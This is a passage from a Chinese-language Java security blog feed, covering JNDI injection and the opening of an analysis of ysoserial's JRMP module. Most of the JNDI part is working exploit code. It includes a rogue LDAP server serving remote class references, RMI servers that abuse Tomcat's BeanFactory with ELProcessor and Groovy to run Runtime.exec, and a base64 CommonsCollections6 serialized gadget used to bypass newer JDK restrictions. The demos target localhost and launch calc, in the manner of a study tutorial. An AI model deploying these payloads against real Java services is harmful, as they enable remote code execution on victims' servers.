Entry e ) throws LDAPException, MalformedURLException &#123;</span><br><span class="line">            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));</span><br><span class="line">            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);</span><br><span class="line">            String cbstring = this.codebase.toString();</span><br><span class="line">            int refPos = cbstring.indexOf(&#x27;#&#x27;);</span><br><span class="line">            if ( refPos &gt; 0 ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(0, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(&quot;javaClassName&quot;, &quot;Exploit&quot;);</span><br><span class="line">            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span><br><span class="line">            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span><br><span class="line">            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">public class ldapClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //初始化上下文</span><br><span class="line">        Context initialContext = new InitialContext();</span><br><span class="line">        //调用远程类</span><br><span class="line">        initialContext.lookup(&quot;ldap://127.0.0.1:10389/EvilClass&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样确保客户端访问不到 EvilClass 类文件，是可以远程加载的。</p><h2 id="JDK-高版本绕过"><a href="#JDK-高版本绕过" class="headerlink" title="JDK 高版本绕过"></a>JDK 高版本绕过</h2><h4 id="RMI-高版本绕过"><a href="#RMI-高版本绕过" class="headerlink" title="RMI 高版本绕过"></a>RMI 高版本绕过</h4><p>在 JDK 8u121、7u131、6u141 版本之后，默认不信任远程代码，无法加载 RMI 远程对象。此时再运行上面 JNDI + RMI 的代码则会爆出如下错误：</p><img src="/images/image-20240904123125191.png"><p>需要添加以下参数才能成功运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.sun.jndi.rmi.object.trustURLCodebase=true</span><br></pre></td></tr></table></figure><p>那么我直接在客户端代码中设置系统属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br></pre></td></tr></table></figure><p>在 JDK 8u392 的环境中，运行后成功获取 RMI 远程对象，但是并没有去 Reference 指定的 URL 中获取远程对象，最终获取的是空值，所以也没有成功执行命令。</p><p>回到正题，JDK 高版本之后，原本用于实例化远程对象的 RegistryContext#decodeObject 现在多了一条判断机制：</p><img src="/images/image-20240904190359616.png"><p>也就是说想要成功实例化对象，要不就 Reference 对象为空，要不就 Reference 对象的 classFactoryLocation 属性为空，要不就系统属性 com.sun.jndi.rmi.object.trustURLCodebase 设置为 true 。</p><p>目前最好利用的是第二种情况，Reference 对象的 classFactoryLocation 属性为空，也就是说，RMI 服务端在绑定 Reference 对象时，不能够指定获取工厂类的远程地址，那么客户端就只能从本地获取工厂类。如果能从客户端加载合适的工厂类，依然可以达成目的。</p><h6 id="BeanFactory-类"><a href="#BeanFactory-类" class="headerlink" title="BeanFactory 类"></a>BeanFactory 类</h6><p>说到客户端本地的工厂类，org.apache.naming.factory.BeanFactory 是比较常用的工厂类之一，这个类存在于 Tomcat 8 环境中。</p><p>在测试环境下，为客户端添加如下依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.5.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-jasper-el&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.5.0&lt;/version&gt; &lt;!-- 使用适合你的项目的Tomcat版本 --&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>RMI 服务端代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line">import javax.naming.StringRefAddr;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class TomcatRmiServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);</span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;test=eval&quot;));</span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;test&quot;, &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;));</span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);</span><br><span class="line">        registry.bind(&quot;Tomcat8bypass&quot;, referenceWrapper);</span><br><span class="line">        System.out.println(&quot;Registry运行中......&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>受害者客户端代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">public class TomcatRmiClient &#123;</span><br><span class="line">    public static void main(String[]args) throws Exception&#123;</span><br><span class="line">        String string = &quot;rmi://localhost:1099/Tomcat8bypass&quot;;</span><br><span class="line">        InitialContext initialContext = new InitialContext();</span><br><span class="line">        initialContext.lookup(string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后成功弹出计算器。</p><p>接下来说一下服务端代码为什么这么写。</p><h6 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h6><p>运行服务端代码，调试客户端代码。</p><p>在 JNDI 动态协议转换的调用链最后，我们来到了 NamingManager#getObjectInstance 方法，而在这个方法中最终会调用 BeanFactory 的 getObjectInstance 方法：</p><img src="/images/image-20240905180127975.png"><p>跟进 BeanFactory 的 getObjectInstance 方法：</p><img src="/images/image-20240905180447349.png"><p>首先就会判断传入的 obj 对象是否是 ResourceRef 类的实例，这就是服务端代码封装一个 ResourceRef 对象的原因。</p><p>接下来获取 ResourceRef 其中的 forceString 属性值，也就是 “test&#x3D;eval” ，将等号作为分隔符分隔字符串，setterName 获取了等号右边的部分，也就是 eval ，而 param 获取了等号左边的部分 test 。最后将它们 put 进一个 HashMap 里面：</p><img src="/images/image-20240905180852100.png"><p>接下来就是遍历 ref 的所有属性，获取除了 scope、auth、forceString、singleton 以外的属性。这里获取到 test 属性，其值是 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code> ，也就是我们一开始设置的那个属性。</p><img src="/images/image-20240906124955341.png"><p>由于 HashMap 对象 forced 中存在键 test -&gt; eval ，这里获取的 method 自然不为空，于是在这里就执行了 calc 命令：</p><img src="/images/image-20240906125300326.png"><p>在这里就可以看出：BeanFactory 这个类实际上允许执行任意类的任意方法，而服务端代码选用了 javax.el.ELProcessor 的 eval 方法，参数就是 Runtime.getRuntime().exec(“calc”) ，来命令执行。</p><h6 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h6><p>Groovy 是一种面向对象的动态脚本语言，运行在 Java 虚拟机 (JVM) 上，具备与 Java 无缝集成的特性。在 Groovy 中，@ASTTest 是一种用于抽象语法树（AST）测试的特殊注解。它允许我们在编译阶段对代码的 AST（Abstract Syntax Tree，抽象语法树）进行断言和检查。也就是说在生成字节码之前，可以通过 @ASTTest 下断言执行代码。</p><p>Groovy 中的 AST 是在编译过程中对代码结构的中间表示。编译器将源代码转换为 AST 后，再生成字节码。</p><p>利用方式还是用 BeanFactory 类调用 GroovyClassLoader 类的 parseClass 方法，执行一个 Groovy 脚本。</p><p>服务端代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package GroovyRmi;</span><br><span class="line"></span><br><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">import javax.naming.StringRefAddr;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class GroovyRmiServer &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(&quot;groovy.lang.GroovyClassLoader&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;faster=parseClass&quot;));</span><br><span class="line">        String script = String.format(&quot;@groovy.transform.ASTTest(value=&#123;\nassert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)\n&#125;)\ndef faster\n&quot;, &quot;calc&quot;);</span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;faster&quot;,script));</span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);</span><br><span class="line">        registry.bind(&quot;Groovy2bypass&quot;, referenceWrapper);</span><br><span class="line">        System.out.println(&quot;Registry运行中......&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="LDAP-高版本绕过"><a href="#LDAP-高版本绕过" class="headerlink" title="LDAP 高版本绕过"></a>LDAP 高版本绕过</h4><p>JDK 11.0.1、8u191、7u201、6u211 版本之后，默认禁用了远程类加载，需要将 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 设置为 true 才能解除限制，那么通过设置 codebase 远程加载的方式就显得有些鸡肋了。</p><h6 id="序列化存储"><a href="#序列化存储" class="headerlink" title="序列化存储"></a>序列化存储</h6><p>LDAP 除了通过类似 codebase 的方式存储远程对象的信息外，还可以直接存储对象的序列化数据，只需要设置以下两个属性即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javaSerializedData: aced00573…</span><br><span class="line">javaClassName: Exploit</span><br></pre></td></tr></table></figure><p>以 CC6 为例，我们先生成一段编码后的 CC6 的序列化数据，然后将其添加到 LDAP 的属性中。LDAP 服务端代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line">import com.unboundid.ldap.sdk.Entry;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line">import com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line">import javax.net.ServerSocketFactory;</span><br><span class="line">import javax.net.SocketFactory;</span><br><span class="line">import javax.net.ssl.SSLSocketFactory;</span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class ldapServerSerialize &#123;</span><br><span class="line">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class="line">    public static void main (String[] args) &#123;</span><br><span class="line">        String url = &quot;http://127.0.0.1:8002/#EvilClass&quot;;</span><br><span class="line">        int port = 10389;</span><br><span class="line">        try &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class="line">                    &quot;listen&quot;,</span><br><span class="line">                    InetAddress.getByName(&quot;0.0.0.0&quot;),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;</span><br><span class="line">        private URL codebase;</span><br><span class="line">        /**</span><br><span class="line">         * */ public OperationInterceptor ( URL cb ) &#123;</span><br><span class="line">            this.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line">        /**</span><br><span class="line">         * &#123;@inheritDoc&#125;</span><br><span class="line">         * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="line">         */ @Override</span><br><span class="line">        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = new Entry(base);</span><br><span class="line">            try &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            catch ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;</span><br><span class="line">            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));</span><br><span class="line">            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);</span><br><span class="line">            String cbstring = this.codebase.toString();</span><br><span class="line">            int refPos = cbstring.indexOf(&#x27;#&#x27;);</span><br><span class="line">            if ( refPos &gt; 0 ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(0, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            String base64Data = &quot;rO0ABXNyABFqYXZhLnV0&quot; +</span><br><span class="line">                    &quot;aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAA&quot; +</span><br><span class="line">                    &quot;Ax3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5&quot; +</span><br><span class="line">                    &quot;UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21h&quot; +</span><br><span class="line">                    &quot;cHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADa2V5c3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZ&quot; +</span><br><span class="line">                    &quot;WN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2Nv&quot; +</span><br><span class="line">                    &quot;bW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmN&quot; +</span><br><span class="line">                    &quot;vbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5&quot; +</span><br><span class="line">                    &quot;zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3h&quot; +</span><br><span class="line">                    &quot;wdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZA&quot; +</span><br><span class="line">                    &quot;gAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdG&quot; +</span><br><span class="line">                    &quot;FudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5&quot; +</span><br><span class="line">                    &quot;SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVu&quot; +</span><br><span class="line">                    &quot;Y3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL&quot; +</span><br><span class="line">                    &quot;09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdA&quot; +</span><br><span class="line">                    &quot;ASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHA&quot; +</span><br><span class="line">                    &quot;AAAACdAAKZ2V0UnVudGltZXB0ABFnZXREZWNsYXJlZE1ldGhvZHVyABJbTGphdmEubGFuZy5DbGFzc&quot; +</span><br><span class="line">                    &quot;zurFteuy81amQIAAHhwAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AHHN&quot; +</span><br><span class="line">                    &quot;xAH4AE3VxAH4AGAAAAAJwcHQABmludm9rZXVxAH4AHAAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAA&quot; +</span><br><span class="line">                    &quot;AAAAAAAAAAAeHB2cQB+ABhzcQB+ABN1cQB+ABgAAAABdAAEY2FsY3QABGV4ZWN1cQB+ABwAAAABcQB&quot; +</span><br><span class="line">                    &quot;+AB9zcQB+AAA/QAAAAAAADHcIAAAAEAAAAAB4eHQABHRlc3R4&quot;;</span><br><span class="line">            e.addAttribute(&quot;javaClassName&quot;, &quot;Exploit&quot;);</span><br><span class="line">            e.addAttribute(&quot;javaSerializedData&quot;, Base64.getDecoder().decode(base64Data));</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端代码不变，运行后依旧能成功命令执行。</p><p>这样的方式就不需要受害者去远程加载类，而只需要客户端本地有对应的依赖即可。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://evilpan.com/2021/12/13/jndi-injection/">JNDI 注入漏洞的前世今生</a></p><p><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/">Java 反序列化之 JNDI 学习</a></p><p><a href="https://goodapple.top/archives/696">Java 安全学习 —— JNDI 注入</a></p><p><a href="https://stoocea.github.io/post/JNDIRe0.html">JNDI 重看</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JNDI-基础&quot;&gt;&lt;a href=&quot;#JNDI-基础&quot; class=&quot;headerlink&quot; title=&quot;JNDI 基础&quot;&gt;&lt;/a&gt;JNDI 基础&lt;/h2&gt;&lt;p&gt;JNDI 全称为 &lt;strong&gt;Java Naming and Directory Interfa</summary>
      
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞篇 - ysoserial 的 JRMP 模块分析</title>
    <link href="https://changeyourway.github.io/2024/08/28/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-ysoserial%E7%9A%84JRMP%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90/"/>
    <id>https://changeyourway.github.io/2024/08/28/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-ysoserial%E7%9A%84JRMP%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90/</id>
    <published>2024-08-28T03:30:25.761Z</published>
    <updated>2024-08-28T03:31:53.041Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JRMP-协议介绍"><a href="#JRMP-协议介绍" class="headerlink" title="JRMP 协议介绍"></a>JRMP 协议介绍</h2><p>JRMP（Java Remote Method Protocol）是为 Java RMI 设计的专有协议，负责处理 RMI 调用的实际网络传输。它是基于 TCP 的，确保了通信的可靠性和有序性。也就是说：RMI 使用 JRMP 协议来处理网络通信。</p><p>当然，RMI 并不止支持 JRMP 这一种协议，还可以使用比如 IIOP 协议来进行网络通信。</p><h2 id="ysoserial-中的-JRMP-模块"><a href="#ysoserial-中的-JRMP-模块" class="headerlink" title="ysoserial 中的 JRMP 模块"></a>ysoserial 中的 JRMP 模块</h2><p>通常有两种利用方式。</p><p>第一种：payloads&#x2F;JRMPListener + exploit&#x2F;JRMPClient </p><p>第二种：exploit&#x2F;JRMPListener + payloads&#x2F;JRMPClient </p><p>接下来我们会逐个分析这四个类。</p><h3 id="payloads-JRMPListener-exploit-JRMPClient"><a href="#payloads-JRMPListener-exploit-JRMPClient" class="headerlink" title="payloads&#x2F;JRMPListener + exploit&#x2F;JRMPClient"></a>payloads&#x2F;JRMPListener + exploit&#x2F;JRMPClient</h3><p>ysoserial 中的 exploit&#x2F;JRMPClient 是作为攻击方的代码，一般会结合 payloads&#x2F;JRMPLIstener 使用，攻击流程就是：</p><p>1、先往存在漏洞的服务器发送 payloads&#x2F;JRMPLIstener ，服务器反序列化该 payload 后，会开启一个 rmi 服务并监听在设置的端口</p><p>2、然后攻击方在自己的服务器使用 exploit&#x2F;JRMPClient 与存在漏洞的服务器进行通信，并且发送一个可命令执行的 payload，从而达到命令执行的结果。</p><p>在 payloads&#x2F;JRMPListener 的代码注释中，作者已经给出了调用链，这与我们在上一篇文章中分析的 UnicastRemoteObject 调用链一致，就不再赘述：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Gadget chain:</span><br><span class="line"> * UnicastRemoteObject.readObject(ObjectInputStream) line: 235</span><br><span class="line"> * UnicastRemoteObject.reexport() line: 266</span><br><span class="line"> * UnicastRemoteObject.exportObject(Remote, int) line: 320</span><br><span class="line"> * UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383</span><br><span class="line"> * UnicastServerRef.exportObject(Remote, Object, boolean) line: 208</span><br><span class="line"> * LiveRef.exportObject(Target) line: 147</span><br><span class="line"> * TCPEndpoint.exportObject(Target) line: 411</span><br><span class="line"> * TCPTransport.exportObject(Target) line: 249</span><br><span class="line"> * TCPTransport.listen() line: 319</span><br></pre></td></tr></table></figure><p>调用的顺序是从上往下，我们先来分析 payloads&#x2F;JRMPListener 类。</p><h4 id="payloads-JRMPListener"><a href="#payloads-JRMPListener" class="headerlink" title="payloads&#x2F;JRMPListener"></a>payloads&#x2F;JRMPListener</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public class JRMPListener extends PayloadRunner implements ObjectPayload&lt;UnicastRemoteObject&gt; &#123;</span><br><span class="line"></span><br><span class="line">    public UnicastRemoteObject getObject(final String command) throws Exception &#123;</span><br><span class="line">        int jrmpPort = Integer.parseInt(command);</span><br><span class="line">        UnicastRemoteObject uro = 